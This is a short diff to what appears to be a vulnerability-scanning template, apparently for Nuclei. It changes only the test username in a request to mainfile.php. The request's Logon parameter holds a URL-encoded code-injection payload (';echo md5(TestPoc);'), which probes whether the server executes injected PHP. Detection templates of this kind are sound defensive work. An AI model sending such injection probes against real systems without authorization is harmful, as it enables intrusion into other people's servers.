@@ -16,7 +16,7 @@ info:
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/mainfile.php?username=testnmanp&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27'
+      - '{{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27'
 
     matchers-condition: and
     matchers:
